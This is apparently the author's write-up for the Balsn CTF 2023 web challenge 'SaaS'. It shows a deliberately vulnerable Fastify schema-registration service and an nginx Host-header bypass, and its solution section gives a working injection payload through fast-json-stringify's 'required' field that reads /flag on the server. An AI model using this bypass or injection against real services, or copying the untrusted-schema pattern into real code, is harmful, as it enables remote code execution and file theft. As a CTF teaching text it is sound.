---
title: '2023 Balsn CTF Web/Saas author Writeup'
disqus: hackmd
tags: note
---



# SaaS

<img src="https://hackmd.io/_uploads/r1IqunQ-p.png" width=400>

## Description
:::warning
Author's murmur warning! u can jump to [Overview](#Overview).
:::

- The challenge is inspired from [fastify document](https://fastify.dev/docs/latest/Reference/Validation-and-Serialization)
![](https://hackmd.io/_uploads/SJPMNYz-T.png)
- The official doesn't support dynamic creation of schema validation by default, and fastify only precompile schema validation once when the server startup.
- I try to find the real use case or plugin that support dynamic schema/route creation, and the official doesn't like this proposal. see https://github.com/fastify/help/issues/149
- The package `fast-json-stringify` is used to create validator. Thus, I try to find any dependents which has any use case that creates validator from untrusted user input, and 404 not found.
<img src="https://hackmd.io/_uploads/H1hhd27Wp.png" width=400>
- Also, document mentions this [security notice](https://www.npmjs.com/package/fast-json-stringify?activeTab=readme#user-content-security-notice)
<img src="https://hackmd.io/_uploads/rkWRd2mZ6.png" width=500>
- But it is CTF,impractialty is ok, right? And deadline is approaching... That's make it a service to create dynamic schema!
- An additional part is nginx. Since ginoah estimated about 50~100 solves (`easy+++++++`), i comed up with it  when i was reading document for solving ginoah's 1linenginx.
- Then ginoah and kaibro solved this part as soon as they read it. Only i learned it in 2023.
- Thus, the final difficulty is `easy++++++`.

## Overview

- The challenge is clear, try to find where we can inject code in something like `new Function(...)` when create custom schema validator.

```
const validatorFactory = require('@fastify/fast-json-stringify-compiler').SerializerSelector()()
const fastify = require('fastify')({
  logger: true,
})
const {v4: uuid} = require('uuid')
const FLAG = 'the old one'
const customValidators = Object.create(null, {}) // no more p.p.
const defaultSchema = {
  type: 'object',
  properties: {
    pong: {
      type: 'string',
    },
  },
}
fastify.get(
  '/',
  {
    schema: {
      response: {
        200: defaultSchema,
      },
    },
  },
  async () => {
    return {pong: 'hi'}
  }
)
fastify.get('/whowilldothis/:uid', async (req, resp) => {
  const {uid} = req.params
  const validator = customValidators[uid]
  if (validator) {
    return validator({[FLAG]: 'congratulations'})
  } else {
    return {msg: 'not found'}
  }
})

fastify.post('/register', {}, async (req, resp) => {
  // can only access from internal.
  const nid = uuid()
  const schema = Object.assign({}, defaultSchema, req.body)
  customValidators[nid] = validatorFactory({schema})
  return {route: `/whowilldothis/${nid}`}
})
fastify.listen({port: 3000, host: '0.0.0.0'}, function (err, address) {
  if (err) {
    fastify.log.error(err)
    process.exit(1)
  }
  // Server is now listening on ${address}
})
```

- and we have to route request to `server_name` like `*.saas` but with HTTP header set to `Host: easy++++++`
```
server {
    listen 80 default_server;
    return 404;
}
server {
    server_name *.saas;
    if ($http_host != "easy++++++") { return 403 ;}
    location ~ {
      proxy_pass http://backend:3000;
    }
}
```

## Solution
 
### Nginx
 - Nginx part is trivial, from [document](http://nginx.org/en/docs/http/ngx_http_core_module.html#var_host)
![](https://hackmd.io/_uploads/Byh40FMWa.png)
- Nginx match `server_name` with `$host`, and it can be  set by `request line`. Then below request bypass the check.
    ```
    GET http://any.saas/ HTTP/1.1
    Host: easy++++++
    ```

### fast-json-stringify

- open vscode, start debugger, trace code.
- I found `requiredProperty` 
```
  // handle extraneous required fields
  for (const requiredProperty of required) {
    if (requiredWithDefault.indexOf(requiredProperty) !== -1) continue
    code += `if (obj['${requiredProperty}'] === undefined) throw new Error('"${requiredProperty}" is required!')\n`
  }
```
![](https://hackmd.io/_uploads/rylkLWcGWT.png)
![](https://hackmd.io/_uploads/ByYNb5G-a.png)

- Then
```
POST http://a.saas/register HTTP/1.1 
Host: easy++++++
Content-Type: application/json 
Content-Length: 104

{"$id":"aaa","required":["'+global.process.mainModule.constructor._load('fs').readFileSync('/flag')+'"]}


HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Tue, 10 Oct 2023 08:59:27 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 63
Connection: keep-alive

{"route":"/whowilldothis/1c6c400d-94c6-438b-a410-7828f2e05aad"}
```
![](https://hackmd.io/_uploads/HkB6GqMZT.png)
